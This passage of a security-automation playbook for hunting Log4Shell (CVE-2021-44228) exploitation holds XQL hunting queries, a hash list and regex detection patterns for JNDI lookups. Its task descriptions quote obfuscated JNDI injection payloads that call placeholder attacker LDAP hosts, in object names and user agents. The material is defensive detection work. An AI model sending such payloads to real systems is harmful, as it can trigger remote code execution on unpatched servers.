"c39b0ea14e7766440c59e5ae5f48adee038d9b1c7a1375b376e966ca12c22cd3", "6f38a25482d82cd118c4255f25b9d78d96821d22bab498cdce9cda7a563ca992", "54962835992e303928aa909730ce3a50e311068c0960c708e82ab76701db5e6b", "e5e9b0f8d72f4e7b9022b7a83c673334d7967981191d2d98f9c57dc97b4caae1", "68d793940c28ddff6670be703690dfdf9e77315970c42c4af40ca7261a8570fa", "9da0f5ca7c8eab693d090ae759275b9db4ca5acdbcfe4a63d3871e0b17367463", "006fc6623fbb961084243cfc327c885f3c57f2eba8ee05fbc4e93e5358778c85")

          | dedup agent_hostname , action_file_sha256, action_file_path , actor_process_image_sha256 , actor_process_image_path , causality_actor_process_image_sha256 , causality_actor_process_image_path
      query_name:
        simple: Detecting a files that matches the SHA256 hash of the Log4j vulnerable
          versions.
      time_frame:
        simple: 7 days
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 3410,
          "y": 2850
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 2
    isoversize: false
    isautoswitchedtoquietmode: false
  "79":
    id: "79"
    taskid: 60a3c165-9276-437d-8df9-47db380139aa
    type: regular
    task:
      id: 60a3c165-9276-437d-8df9-47db380139aa
      version: -1
      name: Detecting Potentially Malicious Activity Attributed with the Log4j Exploitation
      description: |-
        Section B: Detecting Potentially Malicious Activity Attributed with the Log4j Exploitation

        Given the sheer amount of obfuscation possible on the malicious User-Agents like:
        ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}
        ${JnD${upper:i}:lda${env:XXXX2323:-p}:/
        ${jndi:ldap://host/$
        ${jndi:${lower:l}${lower:d}a${lower:p}:
        We’ve decided to choose a regular expression targeting all permutations of the potential resources.
      tags:
      - UserXQL
      script: '|||xdr-xql-generic-query'
      type: regular
      iscommand: true
      brand: ""
    nexttasks:
      '#none#':
      - "42"
    scriptarguments:
      query:
        simple: |-
          config case_sensitive = false timeframe=7d |
          dataset = xdr_data

          | filter lowercase(action_user_agent) ~= "((?:\%24\%7B|\$%7B|\$\{|\$[^//]+\{)(?:j|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+j|(?:\-|\}|\:|\:\-|\}|\:|\$)j[^//]+|jn|jnd)(?:n|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+n|(?:\-|\}|\:|\:\-|\}|\:|\$)n[^//]+|nd|ndi)?(?:d|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+d|(?:\-|\}|\:|\:\-|\}|\:|\$)n[^//]+|di)(?:i|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+i|(?:\-|\}|\:|\:\-|\}|\:|\$)i[^//]+))" OR lowercase(action_user_agent) ~= "\${jndi"

          | alter rfc1918_172 = incidr(action_remote_ip , "172.16.0.0/12")

          | alter rfc1918_10 = incidr(action_remote_ip, "10.0.0.0/8")

          | alter rfc1918_192 = incidr(action_remote_ip, "192.168.0.0/16")

          | filter (rfc1918_172 = false and rfc1918_10 = false and rfc1918_192 = false)

          | fields action_user_agent,agent_hostname, action_process_image_name, action_process_image_command_line
      query_name:
        simple: Detecting Potentially Malicious Activity Attributed with the Log4j
          Exploitation
      time_frame:
        simple: 7 days
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 2530,
          "y": 2850
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 2
    isoversize: false
    isautoswitchedtoquietmode: false
  "80":
    id: "80"
    taskid: c66c143c-89d9-4911-85a0-e8408cfcca17
    type: condition
    task:
      id: c66c143c-89d9-4911-85a0-e8408cfcca17
      version: -1
      name: Check if Cortex XDR - XQL Query Engine is Enabled
      description: Returns 'yes' if integration brand is available. Otherwise returns
        'no'
      scriptName: IsIntegrationAvailable
      type: condition
      iscommand: false
      brand: ""
    nexttasks:
      "no":
      - "42"
      "yes":
      - "81"
      - "82"
    scriptarguments:
      brandname:
        simple: Cortex XDR - XQL Query Engine
    results:
    - brandInstances
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1590,
          "y": 2530
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "81":
    id: "81"
    taskid: 896a1b4d-c236-4731-865b-8d460f6acb66
    type: title
    task:
      id: 896a1b4d-c236-4731-865b-8d460f6acb66
      version: -1
      name: Hunting for Log4Shell in Your Network
      type: title
      iscommand: false
      brand: ""
      description: ''
    nexttasks:
      '#none#':
      - "79"
      - "77"
      - "78"
      - "86"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 3190,
          "y": 2700
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "82":
    id: "82"
    taskid: 692af273-75e5-4bd4-882c-f439122857a0
    type: title
    task:
      id: 692af273-75e5-4bd4-882c-f439122857a0
      version: -1
      name: Hunting for Log4Shell in Your Cloud Environment
      type: title
      iscommand: false
      brand: ""
      description: ''
    nexttasks:
      '#none#':
      - "84"
      - "85"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1840,
          "y": 2700
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "84":
    id: "84"
    taskid: b54f21dd-f658-490e-81bc-1e13bb5a05f6
    type: regular
    task:
      id: b54f21dd-f658-490e-81bc-1e13bb5a05f6
      version: -1
      name: Hunt additional exploitation attempts within cloud audit logs
      description: "Leveraging the exploitation upon API calls (as those API calls\
        \ are usually logged) and their associated attributes controlled by the attacker\
        \ such as the requests parameters of the API call or  the user-agent. \nFor\
        \ example:\nCloud storage services, modify the object name:\nprojects/_/buckets/<BUCKET-NAME>/objects/${jndi:ldap://<ATTACKER-IP>:<PORT>/Exploit}\n\
        User agent:\n${jndi:${lower:l}${lower:d}a${lower:p}://<ATTACKER-DNS>.bin${upper:a}.io:<PORT>/callback}"
      tags:
      - UserXQL
      script: '|||xdr-xql-generic-query'
      type: regular
      iscommand: true
      brand: ""
    nexttasks:
      '#none#':
      - "42"
    scriptarguments:
      query:
        simple: |-
          dataset = cloud_audit_logs
          | alter raw_log_decoded = replace(replace(replace(lowercase(raw_log), "%7b", "{"), "%24","$"), "%7d", "}")

          | filter raw_log_decoded ~= "((?:\%24\%7B|\$%7B|\$\{|\$[^//]+\{)(?:j|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+j|(?:\-|\}|\:|\:\-|\}|\:|\$)j[^//]+|jn|jnd)(?:n|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+n|(?:\-|\}|\:|\:\-|\}|\:|\$)n[^//]+|nd|ndi)?(?:d|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+d|(?:\-|\}|\:|\:\-|\}|\:|\$)n[^//]+|di)(?:i|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+i|(?:\-|\}|\:|\:\-|\}|\:|\$)i[^//]+))" OR raw_log_decoded ~= "\${jndi"
          | fields caller_ip, project, identity_name, identity_type, identity_sub_type, operation_name_orig, operation_status, referenced_resource_name, caller_ip_asn_org, caller_ip_geolocation
      query_name:
        simple: Hunt additional exploitation attempts within cloud audit logs
      time_frame:
        simple: 7 days
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1610,
          "y": 2850
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 2
    isoversize: false
    isautoswitchedtoquietmode: false
  "85":
    id: "85"
    taskid: 88e0c272-3e42-434f-834d-a3506faf7713
    type: regular
    task:
      id: 88e0c272-3e42-434f-834d-a3506faf7713
      version: -1
      name: 'Hunt for successful exploitations by looking at EDR, Firewall and flow
        logs '
      description: |-
        Due to the fact that there are so many exploitation attempts, finding a successful exploitation is not an easy task. However, we can leverage the power of all XDR data resources and hunt those malicious connections.

        By correlating between Cortex XDR cloud, NDR and EDR logs, we are able to extract IOCs from exploitation attempts and match them with established outbound network connections.

        For example, we can extract the attacker IP address from the payload as seen in Cortex XDR cloud logs, and look for successful outbound connections to this IP address. The same steps can be implemented for DNS queries.
      tags:
      - UserXQL
      script: '|||xdr-xql-generic-query'
      type: regular
      iscommand: true
      brand: ""
    nexttasks:
      '#none#':
      - "42"
    scriptarguments:
      query:
        simple: |-
          dataset = cloud_audit_logs
          | alter raw_log_decoded = replace(replace(replace(lowercase(raw_log), "%7b", "{"), "%24","$"), "%7d", "}")

          | filter raw_log_decoded ~= "((?:\%24\%7B|\$%7B|\$\{|\$[^//]+\{)(?:j|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+j|(?:\-|\}|\:|\:\-|\}|\:|\$)j[^//]+|jn|jnd)(?:n|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+n|(?:\-|\}|\:|\:\-|\}|\:|\$)n[^//]+|nd|ndi)?(?:d|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+d|(?:\-|\}|\:|\:\-|\}|\:|\$)n[^//]+|di)(?:i|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+i|(?:\-|\}|\:|\:\-|\}|\:|\$)i[^//]+))" OR raw_log_decoded ~= "\${jndi"

          | filter lowercase(operation_name_orig) not contains "jobservice" and user_agent != null

          | alter ip = arrayindex(regextract(user_agent, "\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b"), 0)

          | filter ip != null

          | fields ip, user_agent, raw_log_decoded

          | join (dataset = xdr_data

          | filter action_remote_ip != null and (event_type = enum.STORY or event_type = enum.NETWORK)

          | fields action_remote_ip, cloud_entity, agent_id

          | alter cloud_instance_name = json_extract_scalar(to_json_string(cloud_entity), "$.entity_name")

          | dedup action_remote_ip, agent_id, cloud_instance_name) as remote_ips

          ip = remote_ips.action_remote_ip

          | fields ip, user_agent, agent_id, cloud_instance_name, raw_log_decoded
      query_name:
        simple: 'Hunt for successful exploitations by looking at EDR, Firewall and
          flow logs '
      time_frame:
        simple: 7 days
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 2060,
          "y": 2850
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 2
    isoversize: false
    isautoswitchedtoquietmode: false
  "86":
    id: "86"
    taskid: 8fe6d4e8-3520-4b65-8cfa-7aaf95b347c6
    type: regular
    task:
      id: 8fe6d4e8-3520-4b65-8cfa-7aaf95b347c6
      version: -1
      name: Creation of a list of the rare Java process
      description: |-
        Harness the power of “out of the ordinary”- The following query will create a list of the rare Java process causality chains for both action processes and their command lines.

        This means that for Java Child Process, the query will count the number of appearances over the past 90 days, and will list them only if they were spotted for less than 10 times on this specific host.

        Ideally, for any type of payload, you will be able to uncover any unusual processes and their commands.
      tags:
      - UserXQL
      script: '|||xdr-xql-generic-query'
      type: regular
      iscommand: true
      brand: ""
    nexttasks:
      '#none#':
      - "42"
    scriptarguments:
      query:
        simple: |-
          config case_sensitive = false timeframe=90d |
          dataset = xdr_data

          | alter ct = current_time()

          | alter diff = timestamp_diff(ct, _time, "DAY")

          | filter event_type = ENUM.FILE

          and (

          actor_process_image_name contains "java"

          )

          and diff < 7

          | dedup action_process_image_command_line, agent_hostname, actor_process_image_name

          | fields action_file_path , action_file_name,agent_hostname, actor_process_image_name, action_process_image_name

          | join conflict_strategy = left type = left

          (

          dataset = xdr_data

          | filter event_type = ENUM.FILE

          and (

          actor_process_image_name contains "java"

          )

          | comp count(action_file_name) as Action_File_Days_count by actor_process_image_name

          ) as Three_Months_Action_Process (Three_Months_Action_Process.actor_process_image_name = actor_process_image_name)

          | join conflict_strategy = left type = left

          (

          dataset = xdr_data

          | filter event_type = ENUM.FILE

          and (

          actor_process_image_name contains "java"

          )

          | comp count(action_file_path) as Path_Days_count by actor_process_image_name

          ) as Three_Months_CommandLine (Three_Months_CommandLine.actor_process_image_name = action_process_image_name )

          | dedup agent_hostname ,actor_process_image_name , action_process_image_name

          | sort asc Path_Days_count , asc Action_File_Days_count

          | filter Path_Days_count < 10 and Action_File_Days_count <10
      query_name:
        simple: Creation of a list of the rare Java process
      time_frame:
        simple: 7 days
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 3850,
          "y": 2850
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 2
    isoversize: false
    isautoswitchedtoquietmode: false
system: true
view: |-
  {
    "linkLabelsPosition": {
      "22_26_Yes": 0.53,
      "22_37_#default#": 0.22,
      "24_25_Yes": 0.53,
      "24_37_#default#": 0.16,
      "32_33_yes": 0.45,
      "32_37_#default#": 0.28,
      "33_37_#default#": 0.12,
      "33_70_ALL": 0.65,
      "69_32_yes": 0.42,
      "69_37_no": 0.47,
      "75_42_#default#": 0.18,
      "80_42_no": 0.15,
      "80_81_yes": 0.29,
      "80_82_yes": 0.43
    },
    "paper": {
      "dimensions": {
        "height": 5805,
        "width": 4780,
        "x": -550,
        "y": -1290
      }
    }
  }
inputs:
- key: SplunkIndex
  value:
    simple: '*'
  required: false
  description: |-
    The Splunk index field to search in.
    Default is "*"
  playbookInputQuery:
- key: SplunkSourcetype
  value:
    simple: '*'
  required: false
  description: |-
    The Splunk sourcetype field to search in.
    Default is "*"
  playbookInputQuery:
- key: SplunkEarliestTime
  value:
    simple: -1d@d
  required: false
  description: The earliest time for Splunk query.
  playbookInputQuery:
- key: QRadarTimeRange
  value:
    simple: Last 1 DAYS
  required: false
  description: The time range for QRadar query.
  playbookInputQuery:
- key: XDRScriptExecution
  value:
    simple: "False"
  required: false
  description: Whether to investigate automatically the endpoint logs "/var/log" using
    XDR Endpoint Script Execution or manually.
  playbookInputQuery:
- key: XDREndpointIDs
  value: {}
  required: false
  description: The Endpoint IDs to search using XDR Endpoint Script Execution in a
    comma delimited format. If you would like the playbook to execute the command
    on all known Linux OS endpoints Set to "ALL".
  playbookInputQuery:
- key: PlaybookDescription
  value:
    simple: "Critical RCE Vulnerability: log4j - CVE-2021-44228\n\nOn Dec. 9, 2021,\
      \ a remote code execution (RCE) vulnerability in Apache log4j 2 was identified\
      \ being exploited in the wild. Public proof of concept (PoC) code was released\
      \ and subsequent investigation revealed that exploitation was incredibly easy\
      \ to perform. \n\nAffected Version\nApache Log4j 2.x <= 2.15.0-rc1\n\nThis playbook\
      \ should be trigger manually and includes the following tasks: \n\n* Collect\
      \ related known indicators from several sources.\n* Indicators and exploitation\
      \ patterns hunting using PAN-OS, Cortex XDR and SIEM products.\n* Block indicators\
      \ automatically or manually.\n\nMitigations:\n* Apache official CVE-2021-44228\
      \ patch.\n* Unit42 recommended mitigations.\n\nMore information:\n[Apache Log4j\
      \ Vulnerability Is Actively Exploited in the Wild (CVE-2021-44228)](https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/)\n\
      \nNote: This is a beta playbook, which lets you implement and test pre-release\
      \ software. Since the playbook is beta, it might contain bugs. Updates to the\
      \ pack during the beta phase might include non-backward compatible features.\
      \ We appreciate your feedback on the quality and usability of the pack to help\
      \ us identify issues, fix them, and continually improve."
  required: false
  description: The playbook description for Rapid Breach Response layout.
  playbookInputQuery:
- key: EDLDomainBlocklist
  value: {}
  required: false
  description: The EDL domain blocklist name.
  playbookInputQuery:
- key: BlockIndicatorsAutomatically
  value:
    simple: "False"
  required: false
  description: Whether to block the indicators automatically or not.
  playbookInputQuery:
- key: CollectedIndicatorsSeverity
  value:
    simple: Malicious
  required: false
  description: "The verdict of the collected indicators. Default is \"Malicious\"\
    . \nOther options can be \"Suspicious\" and \"Unknown\"."
  playbookInputQuery:
- key: RunXQLHuntingQueries
  value:
    simple: "False"
  required: false
  description: Whether to perform XQL hunting queries. Default is "False".
  playbookInputQuery:
outputs: []
tests:
- No tests (auto formatted)
fromversion: 6.0.0
